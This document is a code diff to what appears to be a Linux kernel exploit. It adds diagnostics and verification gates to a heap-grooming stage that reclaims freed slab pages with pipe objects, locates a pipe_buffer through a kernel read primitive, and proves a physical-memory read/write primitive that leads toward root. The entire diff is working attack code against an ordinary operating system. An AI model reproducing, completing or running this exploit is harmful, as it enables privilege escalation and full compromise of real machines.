@@ -25,6 +25,26 @@ static int p0_gate_holders[PIPE_RECLAIM][2];
 static int p0_gate_holders_initialized;
 #endif
 
+static size_t pipe_read_result(int fd, void *data, size_t size,
+                               int *error_out) {
+  size_t total = 0;
+  *error_out = 0;
+  while (total < size) {
+    ssize_t got = read(fd, (char *)data + total, size - total);
+    if (got > 0) {
+      total += (size_t)got;
+      continue;
+    }
+    if (got == 0)
+      break;
+    if (errno == EINTR)
+      continue;
+    *error_out = errno;
+    break;
+  }
+  return total;
+}
+
 pid_t pipe_prepare_child = -1;
 uint64_t kmalloc_pipe_cache;
 uint64_t kmalloc_normal_1k_cache;
@@ -166,7 +186,47 @@ static struct pipe_order3_state *pipe_prepare_order3_probes(void) {
   return state;
 }
 
-static int pipe_probe_sample(uintptr_t base, uint64_t magic) {
+static int pipe_probe_sample(uintptr_t base, uint64_t magic, int probe,
+                             int *read_failures) {
+#if defined(RMG_DIAG_PIPE_ORACLE) && RMG_DIAG_PIPE_ORACLE
+  uint64_t first[8] = {0};
+  uint64_t last[8] = {0};
+  errno = 0;
+  ssize_t first_ret = kernel_read_data(-1, base, first, sizeof(first));
+  int first_errno = errno;
+  errno = 0;
+  ssize_t last_ret = kernel_read_data(
+      -1, base + ORDER3_SIZE - sizeof(last), last, sizeof(last));
+  int last_errno = errno;
+  int first_matches = 0;
+  int last_matches = 0;
+  if (first_ret != (ssize_t)sizeof(first))
+    (*read_failures)++;
+  if (last_ret != (ssize_t)sizeof(last))
+    (*read_failures)++;
+  for (size_t i = 0; i < sizeof(first) / sizeof(first[0]); i++) {
+    first_matches += first[i] == magic;
+    last_matches += last[i] == magic;
+  }
+  if (probe < 3 || (probe + 1) % 64 == 0 ||
+      probe == PIPE_ORDER3_PROBE_MAX - 1) {
+    pr_info("pipe order-3 sample probe=%d magic=%016llx "
+            "read_first=%zd/%d read_last=%zd/%d "
+            "first=%016llx,%016llx last=%016llx,%016llx "
+            "matches=%d/8,%d/8\n",
+            probe, (unsigned long long)magic,
+            first_ret, first_errno, last_ret, last_errno,
+            (unsigned long long)first[0],
+            (unsigned long long)first[7],
+            (unsigned long long)last[0],
+            (unsigned long long)last[7], first_matches, last_matches);
+  }
+  return first_ret == (ssize_t)sizeof(first) &&
+         last_ret == (ssize_t)sizeof(last) &&
+         first_matches == 8 && last_matches == 8;
+#else
+  (void)probe;
+  (void)read_failures;
   uint64_t first[8] = {0};
   uint64_t last[8] = {0};
   if (kernel_read_data(-1, base, first, sizeof(first)) !=
@@ -179,6 +239,7 @@ static int pipe_probe_sample(uintptr_t base, uint64_t magic) {
       return 0;
   }
   return 1;
+#endif
 }
 
 static int pipe_alloc_order3_probe(struct pipe_order3_state *state,
@@ -221,19 +282,41 @@ static int pipe_stage_exact_order3(uintptr_t base,
                                    struct pipe_order3_state *state) {
   int captured = -1;
   int allocated = 0;
+  int read_failures = 0;
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("oracle-loop-start", base, PIPE_ORDER3_PROBE_MAX);
+#endif
   for (int i = 0; i < PIPE_ORDER3_PROBE_MAX; i++) {
     uint64_t magic = PIPE_ORDER3_MAGIC ^ (uint64_t)(i + 1);
     if (!pipe_alloc_order3_probe(state, i, magic))
       break;
     allocated++;
-    if (pipe_probe_sample(base, magic)) {
+    int matched = pipe_probe_sample(base, magic, i, &read_failures);
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    if (i < 4 || (i + 1) % 64 == 0)
+      rmg_diag_checkpoint(matched ? "oracle-hit" : "oracle-probe",
+                          i + 1, read_failures);
+#endif
+    if (matched) {
       captured = i;
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+      rmg_diag_checkpoint("oracle-captured", i, read_failures);
+#endif
       break;
     }
   }
   if (captured < 0) {
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("oracle-miss", allocated, read_failures);
+#endif
+#if defined(RMG_DIAG_PIPE_ORACLE) && RMG_DIAG_PIPE_ORACLE
+    pr_warning("pipe order-3 oracle missed target after %d probes "
+               "read_failures=%d\n", allocated, read_failures);
+    pipe_reclaim_snapshot("oracle-miss", base, allocated);
+#else
     pr_warning("pipe order-3 oracle missed target after %d probes\n",
                allocated);
+#endif
     return 0;
   }
 
@@ -272,42 +355,93 @@ static uintptr_t prepare_controlled_pipe_buffer_page_child(void) {
   uintptr_t base = 0;
   uintptr_t buddy_base = 0;
   int buddy_guard_fd = -1;
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("mmcollect-child-start", 0, 0);
+#endif
   if (!collect_controlled_mm_slab_page(
           &base, target_fds, &buddy_guard_fd, &buddy_base)) {
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("mmcollect-child-failed", 0, 0);
+#endif
     pr_error("controlled pipe mm group collection failed\n");
     return 0;
   }
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("mmcollect-child-done", base, buddy_base);
+  rmg_diag_checkpoint("pipe-probes-start", base, buddy_guard_fd);
+#endif
   pr_info("controlled pipe optional guard fd=%d buddy=%016zx\n",
           buddy_guard_fd, buddy_base);
 
   struct pipe_order3_state *order3_state = pipe_prepare_order3_probes();
   if (!order3_state) {
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("pipe-precreate-failed", 0, 0);
+#endif
     pr_warning("pipe order-3 probe precreate failed\n");
     return 0;
   }
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("pipe-probes-done", base, 0);
+  rmg_diag_checkpoint("pipe-drain-precreate-start", base, PIPE_DRAIN);
+#endif
 
   /* Fill the kmalloc-1k cache with the drain population first. The exact
    * target stays pinned by its probe while those arrays are shrunk; draining
    * the probe then releases the target after the old slabs. */
   for (size_t i = 0; i < PIPE_DRAIN; i++)
     alloc_pipe_object(pipe_fds_drain[i]);
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("pipe-drain-precreate-done", base, PIPE_DRAIN);
+#endif
 
   int anchor_fd = -1;
   unsigned long slabs_before = 0;
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("mm-release-start", base, PIPE_DRAIN);
+#endif
   if (!release_controlled_mm_slab_page(
-          target_fds, &anchor_fd, &slabs_before))
+          target_fds, &anchor_fd, &slabs_before)) {
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("mm-release-failed", base, 0);
+#endif
     return 0;
+  }
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("mm-release-done", anchor_fd, slabs_before);
+#endif
 
-  if (!pipe_stage_exact_order3(base, order3_state))
+  if (!pipe_stage_exact_order3(base, order3_state)) {
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("oracle-stage-failed", base, 0);
+#endif
     return 0;
+  }
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("oracle-stage-done", base, 0);
+  rmg_diag_checkpoint("pipe-reclaim-start", base, PIPE_RECLAIM);
+#endif
 
   for (size_t i = 0; i < PIPE_RECLAIM; i++) {
     alloc_pipe_object(pipe_fds_reclaim[i]);
     size_t allocations = i + 1;
+    int trace_batch = 0;
+#if RMG_DIAG_PIPE_RECLAIM_TRACE
+    trace_batch = allocations % PIPE_OBJS_PER_SLAB == 0;
+#endif
     if (allocations == PIPE_DRAIN || allocations == PIPE_DRAIN + 1 ||
-        allocations == PIPE_RECLAIM) {
+        allocations == PIPE_RECLAIM
+#if defined(RMG_DIAG_PIPE_GROWTH) && RMG_DIAG_PIPE_GROWTH
+        || allocations == 128 || allocations == 256 || allocations == 384 ||
+        allocations == 512 || allocations == 640
+#endif
+        || trace_batch) {
       pipe_reclaim_snapshot("pipe-growth", base, allocations);
     }
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    if (allocations % 128 == 0 || allocations == PIPE_RECLAIM)
+      rmg_diag_checkpoint("pipe-reclaim-progress", allocations, base);
+#endif
   }
 
   unsigned long slabs_after = controlled_mm_slab_count();
@@ -315,9 +449,45 @@ static uintptr_t prepare_controlled_pipe_buffer_page_child(void) {
           base, PIPE_DRAIN, PIPE_RECLAIM, anchor_fd,
           slabs_before, slabs_after);
   if (!slabs_after || slabs_after >= slabs_before) {
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("mm-slab-gate-reject", slabs_before, slabs_after);
+#endif
     pr_warning("controlled pipe reclaim rejected: mm slab not discarded\n");
     return 0;
   }
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("mm-slab-gate-pass", slabs_before, slabs_after);
+#endif
+
+  /* A lower global mm-slab count does not prove that this exact order-3
+   * allocation was reused by the pipe-object cache. Verify its page metadata
+   * before handing the candidate back to the caller. The cache gate may set
+   * pipebuf_page_base to the matching 4 KiB subpage; preserve the original
+   * order-3 base for the later pipe_buffer scan. */
+  uintptr_t order3_base = base;
+  pipebuf_page_base = order3_base;
+  int cache_reclaimed = pipe_reclaim_cache_gate(-1);
+  uintptr_t cache_page = pipebuf_page_base;
+  pipebuf_page_base = order3_base;
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint(cache_reclaimed ? "pipe-cache-gate-match" :
+                                           "pipe-cache-gate-miss",
+                      (unsigned long long)pipe_cache_page_index,
+                      (unsigned long long)cache_page);
+#endif
+  if (!cache_reclaimed ||
+      (cache_page & ~(ORDER3_SIZE - 1)) != order3_base) {
+    pr_warning("controlled pipe reclaim rejected: target page is not in "
+               "the expected pipe cache cache_match=%d page_index=%d "
+               "matched_page=%016zx order3_base=%016zx\n",
+               cache_reclaimed, pipe_cache_page_index,
+               cache_page, order3_base);
+    return 0;
+  }
+  pr_info("controlled pipe reclaim verified target page=%016zx "
+          "page_index=%d cache=%016llx\n",
+          cache_page, pipe_cache_page_index,
+          (unsigned long long)candidate_slab_cache);
   return base;
 }
 
@@ -452,6 +622,9 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
 }
 
 uintptr_t prepare_pipe_buffer_page(void) {
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("pipe-page-prepare-start", 0, 0);
+#endif
   if (PIPE_SHAPE_ROUNDS != 0) {
     for (size_t i = 0; i < PIPE_N_COUNT; i++) {
       make_pipe_object(pipe_fds_n[i]);
@@ -480,14 +653,27 @@ uintptr_t prepare_pipe_buffer_page(void) {
       _exit(1);
     }
     SYSCHK(close(result_pipe[0]));
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("pipe-page-child-start", getpid(),
+                        getenv("CONTROLLED_RECLAIM") != NULL);
+#endif
     uintptr_t base = prepare_pipe_buffer_page_child();
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    rmg_diag_checkpoint("pipe-page-child-pre-handoff", base, getpid());
+#endif
+    pr_info("pipe page child result pid=%d base=%016zx\n", getpid(), base);
     for (size_t i = 0; i < PIPE_DRAIN; i++) {
       close(pipe_fds_drain[i][0]);
       close(pipe_fds_drain[i][1]);
       pipe_fds_drain[i][0] = -1;
       pipe_fds_drain[i][1] = -1;
     }
-    SYSCHK(write(result_pipe[1], &base, sizeof(base)));
+    ssize_t sent = write(result_pipe[1], &base, sizeof(base));
+    int write_errno = errno;
+    pr_info("pipe page child handoff pid=%d write=%zd expected=%zu errno=%d\n",
+            getpid(), sent, sizeof(base), sent < 0 ? write_errno : 0);
+    if (sent != (ssize_t)sizeof(base))
+      _exit(2);
     for (;;) {
       sleep(60);
     }
@@ -496,17 +682,49 @@ uintptr_t prepare_pipe_buffer_page(void) {
   pipe_prepare_child = child;
   SYSCHK(close(result_pipe[1]));
   uintptr_t base = 0;
-  ssize_t got = read(result_pipe[0], &base, sizeof(base));
+  int read_errno = 0;
+  size_t got = pipe_read_result(
+      result_pipe[0], &base, sizeof(base), &read_errno);
   SYSCHK(close(result_pipe[0]));
-  if (got != (ssize_t)sizeof(base)) {
-    pr_error("pipe page child did not report base\n");
+  if (got != sizeof(base)) {
+    int status = 0;
+    pid_t waited = waitpid(child, &status, WNOHANG);
+    pr_error("pipe page child handoff incomplete pid=%d got=%zu expected=%zu "
+             "errno=%d wait=%d status=%d\n",
+             child, got, sizeof(base), read_errno, waited, status);
+    if (waited == 0) {
+      kill(child, SIGKILL);
+      while (waitpid(child, &status, 0) < 0 && errno == EINTR) {}
+      pr_warning("pipe page child stopped after incomplete handoff pid=%d "
+                 "status=%d\n", child, status);
+    }
+    pipe_prepare_child = -1;
+    return 0;
   }
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("pipe-page-parent-handoff", base, child);
+#endif
+  if (!base) {
+    pr_error("pipe page child reported a null base pid=%d\n", child);
+  }
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("pipe-parent-drain-close-start", PIPE_DRAIN, child);
+#endif
   for (size_t i = 0; i < PIPE_DRAIN; i++) {
     close(pipe_fds_drain[i][0]);
     close(pipe_fds_drain[i][1]);
     pipe_fds_drain[i][0] = -1;
     pipe_fds_drain[i][1] = -1;
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+    if ((i + 1) % 16 == 0 || i + 1 == PIPE_DRAIN) {
+      rmg_diag_checkpoint("pipe-parent-drain-close-progress", i + 1,
+                          child);
+    }
+#endif
   }
+#if defined(RMG_DIAG_DURABLE_LOG) && RMG_DIAG_DURABLE_LOG
+  rmg_diag_checkpoint("pipe-parent-drain-close-done", PIPE_DRAIN, child);
+#endif
   return base;
 }
 
@@ -584,12 +802,26 @@ uintptr_t page_to_direct(uintptr_t page) {
 
 static void pipe_reclaim_snapshot(
     const char *phase, uintptr_t base, size_t allocations) {
+#if !defined(RMG_DIAG_PAGE_IDENTITY) || !RMG_DIAG_PAGE_IDENTITY
   uintptr_t seen[ORDER3_SIZE / PAGE_SIZE];
   size_t seen_count = 0;
+#endif
   for (size_t off = 0; off < ORDER3_SIZE; off += PAGE_SIZE) {
     uintptr_t page = base + off;
     uintptr_t head = direct_to_head_page(-1, page);
+#if defined(RMG_DIAG_PAGE_IDENTITY) && RMG_DIAG_PAGE_IDENTITY
+    uintptr_t page_meta = direct_to_page(page);
+    uint64_t page_word08 = 0;
+    errno = 0;
+    ssize_t word08_ret = kernel_read_data(
+        -1, page_meta + STRUCT_PAGE_COMPOUND_HEAD_OFF,
+        &page_word08, sizeof(page_word08));
+    int word08_errno = errno;
+    if (word08_ret == (ssize_t)sizeof(page_word08))
+      head = (page_word08 & 1) ? page_word08 & ~1ULL : page_meta;
+#endif
     int duplicate = 0;
+#if !defined(RMG_DIAG_PAGE_IDENTITY) || !RMG_DIAG_PAGE_IDENTITY
     for (size_t i = 0; i < seen_count; i++) {
       if (seen[i] == head) {
         duplicate = 1;
@@ -599,6 +831,9 @@ static void pipe_reclaim_snapshot(
     if (duplicate)
       continue;
     seen[seen_count++] = head;
+#else
+    (void)duplicate;
+#endif
 
     uint64_t slab_cache = 0;
     uint64_t page_type = 0;
@@ -610,11 +845,22 @@ static void pipe_reclaim_snapshot(
     ssize_t type_ret = kernel_read_data(
         -1, head + STRUCT_PAGE_TYPE_OFF, &page_type, sizeof(page_type));
     int type_errno = errno;
+#if defined(RMG_DIAG_PAGE_IDENTITY) && RMG_DIAG_PAGE_IDENTITY
+    uintptr_t pfn = (page - DIRECT_MAP_BASE) >> PAGE_SHIFT;
+    pr_info("pipe reclaim snapshot phase=%s alloc=%zu page_off=%#zx "
+            "page=%016zx pfn=%016zx meta=%016zx word08=%zd/%d:%016llx "
+            "head=%016zx cache=%zd/%d:%016llx type=%zd/%d:%08x\n",
+            phase, allocations, off, page, pfn, page_meta,
+            word08_ret, word08_errno, (unsigned long long)page_word08, head,
+            cache_ret, cache_errno, (unsigned long long)slab_cache,
+            type_ret, type_errno, (uint32_t)page_type);
+#else
     pr_info("pipe reclaim snapshot phase=%s alloc=%zu page_off=%#zx "
             "head=%016zx cache=%zd/%d:%016llx type=%zd/%d:%08x\n",
             phase, allocations, off, head, cache_ret, cache_errno,
             (unsigned long long)slab_cache, type_ret, type_errno,
             (uint32_t)page_type);
+#endif
   }
 }
 
@@ -1019,67 +1265,28 @@ int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value) {
   return pipe_phys_write_data(fd, direct_addr, &value, sizeof(value));
 }
 
-int install_pipe_physrw(int fd) {
-  if (pipebuf_page_base == 0) {
-    atomic_store(&pipe_prepare_done, 0);
-    atomic_store(&pipe_prepare_request, 1);
-    while (!atomic_load(&pipe_prepare_done)) {
-      usleep(10000);
-    }
+static int run_pipe_physrw_scratch_proof(int fd) {
+  if (!page_base || pipebuf_page_base == 0 || pipebuf_pipe_idx < 0) {
+    pr_error("physrw proof has no prepared page or correlated pipe\n");
+    return 0;
   }
 
   uintptr_t proof_addr = page_base + PHYSRW_PROOF_OFF;
   uintptr_t proof_page = page_to_direct(direct_to_page(proof_addr));
   if (proof_page != (proof_addr & ~(PAGE_SIZE - 1))) {
+    pr_error("physrw proof address translation mismatch addr=%016zx page=%016zx\n",
+             proof_addr, proof_page);
     return 0;
   }
+
   pipe_cache_gate_ok = 2;
-
-  char marker[PIPE_RECLAIM];
-  memset(marker, 0x61, sizeof(marker));
-  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
-    SYSCHK(write(pipe_fds_reclaim[i][1], marker, i + 1));
-  }
-
-  int found = find_pipe_buffer(fd, pipebuf_page_base);
-  pr_info("phys step pipe probe found=%d pipebuf=%016zx idx=%d scan=%d/%d/%d\n",
-          found, pipebuf_addr, pipebuf_pipe_idx, pipe_scan_vmemmap,
-          pipe_scan_ops, pipe_scan_len);
-  if (!found) {
-    pr_info("phys step pipe scan q0=%016llx q1=%016llx q2=%016llx "
-            "q3=%016llx first_page=%016llx first_ops=%016llx "
-            "first_len=%u first_flags=%u\n",
-            (unsigned long long)pipe_scan_q0,
-            (unsigned long long)pipe_scan_q1,
-            (unsigned long long)pipe_scan_q2,
-            (unsigned long long)pipe_scan_q3,
-            (unsigned long long)pipe_scan_first_page,
-            (unsigned long long)pipe_scan_first_ops,
-            pipe_scan_first_len, pipe_scan_first_flags);
-    /* The page marker can survive even when reclaim freed the mm_struct slab.
-     * Read the struct page metadata for each 4 KiB subpage so the next run can
-     * distinguish a failed kmalloc-1k reclaim from a pipe_buffer layout miss.
-     * This is diagnostic only: restore the order-3 base and gate state. */
-    uintptr_t order3_base = pipebuf_page_base;
-    int gate_before = pipe_cache_gate_ok;
-    int cache_match = pipe_reclaim_cache_gate(fd);
-    pr_info("phys step pipe cache diagnostic matched=%d page_index=%d "
-            "cache_slot=%d gate=%d order3_base=%016zx\n",
-            cache_match, pipe_cache_page_index, pipe_cache_slot_hit,
-            pipe_cache_gate_ok, order3_base);
-    pipebuf_page_base = order3_base;
-    pipe_cache_gate_ok = gate_before;
-  }
-  if (!found) {
-    return 0;
-  }
-  if (!pipe_cache_gate_ok) {
-    pipe_cache_gate_ok = 2;
-  }
+  pr_info("physrw proof scratch addr=%016zx pipe_idx=%d\n",
+          proof_addr, pipebuf_pipe_idx);
 
   char seed[] = PHYS_READ_TAG;
   if (kernel_write_data(fd, proof_addr, seed, sizeof(seed)) !=
       (ssize_t)sizeof(seed)) {
+    pr_error("physrw proof scratch seed failed\n");
     return 0;
   }
 
@@ -1098,24 +1305,171 @@ int install_pipe_physrw(int fd) {
   uintptr_t proof64_addr = proof_addr + 0x100;
   uint64_t seed64 = PHYS64_SEED;
   uint64_t next64 = PHYS64_NEXT;
-  kernel_write_data(fd, proof64_addr, &seed64, sizeof(seed64));
+  if (kernel_write_data(fd, proof64_addr, &seed64, sizeof(seed64)) !=
+      (ssize_t)sizeof(seed64)) {
+    pr_error("physrw proof 64-bit seed failed\n");
+    return 0;
+  }
   physrw_read64_before = pipe_read64(fd, proof64_addr);
   physrw_read64_ok = physrw_read64_before == seed64;
   pr_info("phys step read64 done ok=%d value=%016zx\n",
           physrw_read64_ok, physrw_read64_before);
   physrw_write64_value = next64;
   physrw_write64_ok = pipe_write64(fd, proof64_addr, next64);
-  kernel_read_data(
-      fd, proof64_addr, &physrw_read64_after, sizeof(physrw_read64_after));
+  if (kernel_read_data(fd, proof64_addr, &physrw_read64_after,
+                       sizeof(physrw_read64_after)) !=
+      (ssize_t)sizeof(physrw_read64_after)) {
+    physrw_write64_ok = 0;
+  }
   physrw_write64_ok =
     physrw_write64_ok && physrw_read64_after == physrw_write64_value;
 
+  pr_info("physrw proof result read=%d write=%d read64=%d write64=%d\n",
+          physrw_read_ok, physrw_write_ok,
+          physrw_read64_ok, physrw_write64_ok);
   return physrw_read_ok &&
          memcmp(physrw_readback, seed, sizeof(seed)) == 0 &&
          physrw_write_ok &&
          memcmp(physrw_after_write, overwrite, sizeof(overwrite)) == 0 &&
          physrw_read64_ok && physrw_write64_ok;
 }
+
+int install_pipe_physrw(int fd) {
+#if defined(RMG_DIAG_UCLAMP_TRIGGER_ONLY) && RMG_DIAG_UCLAMP_TRIGGER_ONLY
+  (void)fd;
+  pr_warning("uclamp-trigger-only guard: refusing pipe physical-RW\n");
+  return 0;
+#else
+  if (pipebuf_page_base == 0) {
+    atomic_store(&pipe_prepare_done, 0);
+    atomic_store(&pipe_prepare_request, 1);
+    while (!atomic_load(&pipe_prepare_done)) {
+      usleep(10000);
+    }
+  }
+  if (!run_pipe_reclaim_diagnostic(fd)) {
+    pr_warning("pipe physical read/write rejected: reclaim or marker "
+               "correlation gate failed; root installation skipped\n");
+    return 0;
+  }
+  return run_pipe_physrw_scratch_proof(fd);
+#endif
+}
+
+/* Fill ordinary pipes with per-pipe markers. Require both the expected slab
+ * cache and a live buffer whose page contains that pipe's own marker before
+ * allowing the physical read/write proof to use the candidate. */
+int run_pipe_reclaim_diagnostic(int fd) {
+  if (pipebuf_page_base == 0) {
+    pr_error("pipe reclaim trace has no candidate order-3 page\n");
+    return 0;
+  }
+
+  uintptr_t order3_base = pipebuf_page_base;
+  int cache_match = pipe_reclaim_cache_gate(fd);
+  uintptr_t matched_page = pipebuf_page_base;
+  pipebuf_page_base = order3_base;
+  if (!cache_match ||
+      (matched_page & ~(ORDER3_SIZE - 1)) != order3_base) {
+    pr_warning("pipe reclaim gate rejected cache_match=%d page_index=%d "
+               "matched_page=%016zx order3_base=%016zx\n",
+               cache_match, pipe_cache_page_index,
+               matched_page, order3_base);
+    return 0;
+  }
+  pr_info("pipe reclaim cache gate passed page=%016zx page_index=%d "
+          "cache=%016llx\n",
+          matched_page, pipe_cache_page_index,
+          (unsigned long long)candidate_slab_cache);
+
+  char marker[PIPE_RECLAIM];
+  memset(marker, 0x61, sizeof(marker));
+  int found_any = 0;
+  int correlation_verified = 0;
+  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
+    size_t len = i + 1;
+    uint64_t marker_word = 0x524d475000000000ULL | (uint64_t)len;
+    memcpy(marker, &marker_word, sizeof(marker_word));
+    ssize_t wrote = write(pipe_fds_reclaim[i][1], marker, len);
+    if (wrote != (ssize_t)len) {
+      pr_warning("pipe reclaim trace write failed pipe=%zu len=%zu "
+                 "ret=%zd errno=%d\n", i, len, wrote, errno);
+      return 0;
+    }
+
+    size_t pipes_filled = i + 1;
+    if (pipes_filled % PIPE_OBJS_PER_SLAB != 0 &&
+        pipes_filled != PIPE_RECLAIM)
+      continue;
+
+    pipe_reclaim_snapshot("pipe-marker-batch", pipebuf_page_base,
+                          pipes_filled);
+    int found = find_pipe_buffer(fd, pipebuf_page_base);
+    found_any |= found;
+    uintptr_t data_page = 0;
+    uint64_t observed_marker = 0;
+    uint64_t expected_marker = 0;
+    ssize_t marker_read = -1;
+    int marker_errno = 0;
+    int marker_match = 0;
+    if (found && pipebuf_pipe_idx >= 0) {
+      expected_marker = 0x524d475000000000ULL |
+                        (uint64_t)(pipebuf_pipe_idx + 1);
+      data_page = page_to_direct((uintptr_t)pipe_probe_page);
+      if (is_direct_ptr(data_page)) {
+        errno = 0;
+        marker_read = kernel_read_data(
+            fd, data_page, &observed_marker, sizeof(observed_marker));
+        marker_errno = errno;
+        marker_match = marker_read == (ssize_t)sizeof(observed_marker) &&
+                       observed_marker == expected_marker;
+      }
+    }
+    size_t slab_offset = found ? (size_t)(pipebuf_addr - pipebuf_page_base) : 0;
+    size_t object_offset = slab_offset % PIPE_OBJECT_SIZE;
+    pr_info("pipe reclaim correlation pipes=%zu found=%d matched=%d "
+            "idx=%d buf=%016zx slab_off=%#zx obj_off=%#zx "
+            "page=%016llx data=%016zx offset=0 ops=%016llx "
+            "len=%u flags=%u private=%016llx "
+            "read=%zd/%d marker=%016llx expected=%016llx "
+            "scan=%d/%d/%d first_page=%016llx first_ops=%016llx "
+            "first_len=%u first_flags=%u q0=%016llx q1=%016llx "
+            "q2=%016llx q3=%016llx\n",
+            pipes_filled, found, marker_match, pipebuf_pipe_idx,
+            (size_t)pipebuf_addr, slab_offset, object_offset,
+            (unsigned long long)pipe_probe_page, (size_t)data_page,
+            (unsigned long long)pipe_probe_ops, pipe_probe_len,
+            pipe_probe_flags, (unsigned long long)pipe_probe_private,
+            marker_read, marker_errno,
+            (unsigned long long)observed_marker,
+            (unsigned long long)expected_marker,
+            pipe_scan_vmemmap, pipe_scan_ops, pipe_scan_len,
+            (unsigned long long)pipe_scan_first_page,
+            (unsigned long long)pipe_scan_first_ops,
+            pipe_scan_first_len, pipe_scan_first_flags,
+            (unsigned long long)pipe_scan_q0,
+            (unsigned long long)pipe_scan_q1,
+            (unsigned long long)pipe_scan_q2,
+            (unsigned long long)pipe_scan_q3);
+    if (marker_match) {
+      correlation_verified = 1;
+      break;
+    }
+  }
+
+  pr_info("pipe reclaim trace done found_any=%d correlated=%d idx=%d\n",
+          found_any, correlation_verified, pipebuf_pipe_idx);
+  return correlation_verified;
+}
+
+#if RMG_DIAG_PIPE_RECLAIM_TRACE
+int run_pipe_reclaim_physrw_diagnostic(int fd) {
+  if (!run_pipe_reclaim_diagnostic(fd))
+    return 0;
+  pr_info("pipe marker correlation passed; running scratch physrw proof\n");
+  return run_pipe_physrw_scratch_proof(fd);
+}
+#endif
 
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
 static int pipe_write_full(int fd, const void *data, size_t size) {
